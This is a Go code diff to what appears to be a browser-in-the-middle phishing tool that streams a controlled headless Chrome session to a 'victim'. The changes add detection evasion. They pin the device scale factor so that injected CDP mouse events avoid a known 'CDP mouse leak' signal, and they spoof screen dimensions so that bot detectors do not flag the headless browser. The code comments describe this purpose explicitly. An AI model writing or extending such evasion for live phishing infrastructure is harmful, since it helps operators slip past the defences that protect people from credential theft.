@@ -662,28 +662,36 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 	// Stored as int64 atomics so they can be read from the BrowserCh goroutine
 	// without a mutex; 0 means "not yet received".
 	var vpWidth, vpHeight atomic.Int64
-	var vpDpr atomic.Int64 // recipient devicePixelRatio × 100; 0 means "not yet received"
+	var vpScreenW, vpScreenH atomic.Int64 // recipient screen.width/height; 0 means "not yet received"
 
 	// applyViewport sets the emulated viewport on the rod page if we have both a page
-	// and a non-zero victim viewport. DeviceScaleFactor is set to the recipient's real
-	// devicePixelRatio so a full-page stream is rendered at their device resolution and
-	// stays crisp on HiDPI screens instead of being upscaled. Clamped to [1,2] to bound
-	// bandwidth (each extra factor multiplies the screencast pixel count).
+	// and a non-zero victim viewport. DeviceScaleFactor is pinned to 1: a value != 1
+	// makes Chrome compute mouse movementX/movementY in a scaled space, so
+	// movementX != clientX - prevClientX for CDP-injected events, which detectors flag
+	// as a CDP mouse leak. Rendering at DSF 1 is slightly softer on HiDPI but keeps the
+	// injected mouse coordinates internally consistent.
 	applyViewport := func(page *rod.Page) {
 		w := vpWidth.Load()
 		h := vpHeight.Load()
 		if w <= 0 || h <= 0 || page == nil {
 			return
 		}
-		dsf := float64(vpDpr.Load()) / 100
-		if dsf < 1 {
-			dsf = 1
+		// Mirror the recipient's real screen so screen.width/height stays consistent
+		// with the emulated viewport. Without a screen override the viewport
+		// (innerWidth/Height) exceeds the headless window's default 800x600 screen,
+		// which detectors flag as impossible. Fall back to the viewport size when the
+		// recipient did not report a screen, which still keeps screen >= viewport.
+		sw := int(vpScreenW.Load())
+		if sw < int(w) {
+			sw = int(w)
 		}
-		if dsf > 2 {
-			dsf = 2
+		sh := int(vpScreenH.Load())
+		if sh < int(h) {
+			sh = int(h)
 		}
 		proto.EmulationSetDeviceMetricsOverride{
-			Width: int(w), Height: int(h), DeviceScaleFactor: dsf,
+			Width: int(w), Height: int(h), DeviceScaleFactor: 1,
+			ScreenWidth: &sw, ScreenHeight: &sh,
 		}.Call(page) //nolint:errcheck
 	}
 
@@ -725,9 +733,11 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 				KeyCode   int64           `json:"keyCode"`
 				Modifiers int64           `json:"modifiers"`
 				CharText  string          `json:"charText"`
-				Width     float64         `json:"width"`
-				Height    float64         `json:"height"`
-				Dpr       float64         `json:"dpr"`
+				Width        float64      `json:"width"`
+				Height       float64      `json:"height"`
+				Dpr          float64      `json:"dpr"`
+				ScreenWidth  float64      `json:"screenWidth"`
+				ScreenHeight float64      `json:"screenHeight"`
 			}
 			if json.Unmarshal(msg, &cmd) != nil {
 				continue
@@ -735,8 +745,9 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 			if cmd.Type == "viewport" && cmd.Width > 0 && cmd.Height > 0 {
 				vpWidth.Store(int64(cmd.Width))
 				vpHeight.Store(int64(cmd.Height))
-				if cmd.Dpr > 0 {
-					vpDpr.Store(int64(cmd.Dpr * 100))
+				if cmd.ScreenWidth > 0 && cmd.ScreenHeight > 0 {
+					vpScreenW.Store(int64(cmd.ScreenWidth))
+					vpScreenH.Store(int64(cmd.ScreenHeight))
 				}
 				applyViewport(sess.getBrowserPage())
 				continue
@@ -1341,17 +1352,47 @@ func (m *RemoteBrowserController) StreamLiveSession(g *gin.Context) {
 				return
 			}
 			var header struct {
-				Type     string  `json:"type"`
-				TargetID string  `json:"targetID"`
-				X1       float64 `json:"x1"`
-				Y1       float64 `json:"y1"`
-				X2       float64 `json:"x2"`
-				Y2       float64 `json:"y2"`
+				Type         string  `json:"type"`
+				TargetID     string  `json:"targetID"`
+				X1           float64 `json:"x1"`
+				Y1           float64 `json:"y1"`
+				X2           float64 `json:"x2"`
+				Y2           float64 `json:"y2"`
+				Width        float64 `json:"width"`
+				Height       float64 `json:"height"`
+				ScreenWidth  float64 `json:"screenWidth"`
+				ScreenHeight float64 `json:"screenHeight"`
+				Dpr          float64 `json:"dpr"`
 			}
 			if json.Unmarshal(msg, &header) != nil {
 				continue
 			}
 			switch header.Type {
+			case "viewport":
+				// Editor test runs only: size the target to the admin's own resolution
+				// so remote control is pixel-accurate instead of the headless 800x600
+				// default. Gated on isTest so a live recipient's viewport is never
+				// touched here — the victim owns the shared target's size, and resizing
+				// it under an operator would change what the recipient sees.
+				if controlMode && sess.isTest && header.Width > 0 && header.Height > 0 {
+					if p := getActivePage(); p != nil {
+						// DeviceScaleFactor pinned to 1: a value != 1 makes Chrome scale
+						// mouse movementX/movementY, breaking the movementX == clientX
+						// delta relationship for CDP events (a CDP mouse leak).
+						sw := int(header.ScreenWidth)
+						if sw < int(header.Width) {
+							sw = int(header.Width)
+						}
+						sh := int(header.ScreenHeight)
+						if sh < int(header.Height) {
+							sh = int(header.Height)
+						}
+						proto.EmulationSetDeviceMetricsOverride{
+							Width: int(header.Width), Height: int(header.Height), DeviceScaleFactor: 1,
+							ScreenWidth: &sw, ScreenHeight: &sh,
+						}.Call(p) //nolint:errcheck
+					}
+				}
 			case "switch_tab":
 				tabsMu.Lock()
 				entry, ok := tabs[proto.TargetTargetID(header.TargetID)]
